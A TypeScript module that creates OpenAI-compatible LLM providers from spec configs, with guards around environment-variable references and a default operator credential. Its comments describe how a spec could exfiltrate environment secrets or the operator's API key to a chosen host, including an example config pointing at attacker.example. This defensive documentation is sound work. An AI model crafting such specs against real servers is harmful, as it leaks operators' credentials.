import type { LLMConfig } from '../spec/types.js';
import type { Provider } from './types.js';
import { OpenAIProvider } from './openai.js';
import { LLMError } from '../errors.js';

/**
 * Supported OpenAI-compatible config types.
 * All of these use the OpenAI chat completions API under the hood.
 */
const OPENAI_COMPATIBLE_TYPES = new Set([
  'OpenAiConfig',
  'OpenAiCompatibleConfig',
  'VllmConfig',
  'OllamaConfig',
]);

/**
 * If the value starts with `$`, treat it as an environment variable reference
 * and resolve it. Otherwise return the value as-is.
 *
 * `allowEnvRefs` exists because this is a read of the host's environment
 * directed by the spec, and a spec is not always written by the operator. A
 * flow that pairs `api_key: $ANY_VARIABLE` with a `url` the same flow chooses
 * will send that variable's value to that URL — the variable need not have
 * anything to do with a model. The "is not set" error below is an oracle too,
 * so the environment can be enumerated even when nothing is exfiltrated.
 *
 * Local use is the case this feature was built for and keeps working. Anywhere
 * specs arrive from callers, the reference has to be refused rather than
 * resolved.
 */
function resolveEnvVar(value: string, allowEnvRefs: boolean): string {
  if (value.startsWith('$')) {
    const key = value.slice(1);
    if (!allowEnvRefs) {
      throw new LLMError(
        `"${value}" refers to an environment variable, which this server does not ` +
          `resolve for submitted specs. Put the credential in the spec itself.`,
      );
    }
    const envValue = process.env[key];
    if (!envValue) {
      throw new LLMError(
        `environment variable "${key}" is not set (referenced as "${value}" in spec)`,
      );
    }
    return envValue;
  }
  return value;
}

/**
 * Creates an LLM Provider from a spec LLMConfig.
 *
 * All currently supported configs (OpenAI, vLLM, Ollama, OpenAI-compatible)
 * use the OpenAI SDK with different base URLs and optional API keys.
 */
export interface ProviderOptions {
  /**
   * Whether `$VAR` in a spec may read the host environment. Defaults to true,
   * which is right for a spec the operator wrote. Set false wherever the spec
   * came from a caller — see {@link resolveEnvVar}.
   */
  allowEnvRefs?: boolean;
  /**
   * A credential the operator supplies for specs that name none, so a caller
   * can run a flow without bringing a key. Both halves or neither: see
   * {@link applyDefaultCredential} for why the URL cannot be separated from it.
   */
  defaultUrl?: string;
  defaultKey?: string;
}

/**
 * Fill in the operator's credential, but only where doing so cannot hand it to
 * a caller.
 *
 * The rule is narrow and the reason is specific. A spec chooses its own `url`.
 * If the server filled in a key for a spec that named a URL, then
 *
 *   llm_config: { url: https://attacker.example }     # no api_key
 *
 * would have the operator's key attached and posted to that host. So the
 * default credential is only ever used with the default endpoint: a spec that
 * supplies a URL must supply its own key too, and is refused otherwise rather
 * than quietly falling back to no credential — a caller whose flow suddenly
 * ran unauthenticated would have no idea why it failed.
 */
function applyDefaultCredential(
  opts: { apiKey?: string; baseURL?: string },
  config: LLMConfig,
  options: ProviderOptions,
): void {
  const { defaultUrl, defaultKey } = options;
  if (!defaultKey) return;

  // The spec brought its own credential; nothing to supply.
  if (config.apiKey) return;

  if (config.url) {
    throw new LLMError(
      `this llm_config sets "url" but no "api_key". The server's own credential ` +
        `is only used with its own endpoint, so a flow that chooses where to send ` +
        `requests has to supply the key for them.`,
    );
  }

  opts.apiKey = defaultKey;
  if (defaultUrl) opts.baseURL = defaultUrl;
}

export function createProvider(
  config: LLMConfig,
  options: ProviderOptions = {},
): Provider {
  const allowEnvRefs = options.allowEnvRefs ?? true;
  const configType = config.componentType ?? 'OpenAiConfig';

  if (!OPENAI_COMPATIBLE_TYPES.has(configType)) {
    throw new LLMError(
      `unsupported config type "${configType}". ` +
        `Supported: ${[...OPENAI_COMPATIBLE_TYPES].join(', ')}`,
    );
  }

  const opts: { apiKey?: string; baseURL?: string } = {};

  if (config.apiKey) {
    opts.apiKey = resolveEnvVar(config.apiKey, allowEnvRefs);
  }

  if (config.url) {
    opts.baseURL = config.url;
  }

  applyDefaultCredential(opts, config, options);

  return new OpenAIProvider(opts);
}
